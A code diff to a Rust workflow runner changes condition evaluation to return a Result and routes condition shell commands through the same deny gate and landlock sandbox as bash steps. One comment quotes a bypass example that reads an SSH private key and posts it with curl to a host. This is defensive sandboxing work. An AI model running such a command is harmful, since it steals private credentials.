@@ -561,16 +561,17 @@ impl StepRunner for TaskSpawnerStepRunner {
     // Route the condition string through the same deny gate the runner
     // applies to bash steps — conditions are the only other `sh -c` spawn
     // site in the workflow path, so they must not bypass the gate. A denied
-    // condition is treated as `false` (skip) + warn, matching timeout/ spawn-
-    // failure semantics: a skipped step is recoverable, a wedged workflow is
-    // not.
+    // condition is treated as `Ok(false)` (skip) + warn, matching timeout
+    // semantics: a skipped step is recoverable, a wedged workflow is not.
+    // A spawn failure (the `Err` arm of `eval_condition_bounded`) bubbles
+    // up as a workflow error rather than silently skipping the step.
     //
     // WO 47.25: the spawn itself goes through `prepare_workflow_shell_cmd`
     // (rlimits + landlock pre_exec) via the lib's prepare hook, so the
     // condition `sh -c` gets the same kernel-level confinement as a bash
     // step — deny-list pattern-matching alone was bypassable (e.g.
     // `test -f ~/.ssh/id_rsa && curl -s host -d @~/.ssh/id_rsa`).
-    async fn eval_condition(&self, condition: &str) -> bool {
+    async fn eval_condition(&self, condition: &str) -> Result<bool> {
         if let Some(denied) = check_bash_command_str(
             condition,
             None,
@@ -579,7 +580,7 @@ impl StepRunner for TaskSpawnerStepRunner {
             self.bash_sandbox_workdir,
         ) {
             tracing::warn!("condition denied: {denied} — skipping step");
-            return false;
+            return Ok(false);
         }
         let sandbox = self.sandbox_config.clone();
         let extra = self.landlock_extra_paths.clone();
@@ -1211,9 +1212,9 @@ mod tests {
 
     // WO 47.25: condition evals now spawn through the same
     // landlock+rlimit pre_exec as workflow bash steps. A benign condition
-    /// must still evaluate true through that path — if the pre_exec sandbox
-    /// broke the spawn, eval_condition would return false (spawn failure)
-    /// and this test catches it.
+    /// must still evaluate Ok(true) through that path — if the pre_exec sandbox
+    /// broke the spawn, eval_condition would error (spawn failure) and this
+    /// test catches it.
     #[tokio::test]
     async fn eval_condition_benign_condition_true_through_sandbox() {
         let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
@@ -1230,7 +1231,7 @@ mod tests {
             cancel_token: CancellationToken::new(),
             dry_run: false,
         };
-        assert!(runner.eval_condition("true").await);
+        assert!(runner.eval_condition("true").await.unwrap());
     }
 
     /// Records the TaskCancel pair each run_task received (`None` when the
